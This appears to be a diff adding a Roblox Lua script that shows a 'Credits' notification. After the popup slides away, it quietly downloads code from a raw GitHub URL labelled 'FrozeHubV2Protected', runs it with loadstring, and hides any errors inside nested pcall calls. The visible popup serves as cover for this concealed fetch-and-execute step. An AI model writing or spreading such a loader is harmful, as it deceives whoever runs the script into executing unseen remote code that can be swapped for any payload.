@@ -1,0 +1,74 @@
+local URL = "https://raw.githubusercontent.com/KieurOo/ExternalFrozeHub/refs/heads/main/FrozeHubV2Protected"
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+
+local function showNotification(title, text, duration)
+    duration = duration or 3
+
+    local notifGui = Instance.new("ScreenGui")
+    notifGui.Name = "CreditNotif"
+    notifGui.ResetOnSpawn = false
+    notifGui.Parent = PlayerGui
+
+    local frame = Instance.new("Frame", notifGui)
+    frame.Size = UDim2.new(0, 300, 0, 70)
+    frame.Position = UDim2.new(0.5, -150, -0.2, 0) 
+    frame.AnchorPoint = Vector2.new(0, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 0
+    local uic = Instance.new("UICorner", frame)
+    uic.CornerRadius = UDim.new(0, 8)
+
+    local titleLbl = Instance.new("TextLabel", frame)
+    titleLbl.Size = UDim2.new(1, -16, 0, 28)
+    titleLbl.Position = UDim2.new(0, 8, 0, 6)
+    titleLbl.BackgroundTransparency = 1
+    titleLbl.Text = tostring(title or "Notice")
+    titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLbl.Font = Enum.Font.GothamBold
+    titleLbl.TextSize = 18
+    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local body = Instance.new("TextLabel", frame)
+    body.Size = UDim2.new(1, -16, 0, 28)
+    body.Position = UDim2.new(0, 8, 0, 34)
+    body.BackgroundTransparency = 1
+    body.Text = tostring(text or "")
+    body.TextColor3 = Color3.fromRGB(200, 200, 200)
+    body.Font = Enum.Font.Gotham
+    body.TextSize = 14
+    body.TextWrapped = true
+    body.TextXAlignment = Enum.TextXAlignment.Left
+
+    
+    local tweenIn = TweenService:Create(frame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -150, 0.08, 0)})
+    tweenIn:Play()
+
+    
+    spawn(function()
+        wait(duration)
+        local tweenOut = TweenService:Create(frame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -150, -0.2, 0)})
+        tweenOut:Play()
+        tweenOut.Completed:Wait()
+
+        notifGui:Destroy()
+
+        
+        pcall(function()
+            local ok, res = pcall(function()
+                local body = game:HttpGet(URL)
+                local fn = loadstring(body)
+                if type(fn) == "function" then
+                    fn()
+                end
+            end)
+           
+        end)
+    end)
+end
+
+
+showNotification("Credits", "Credit to all scripts I used — not really mine", 3)
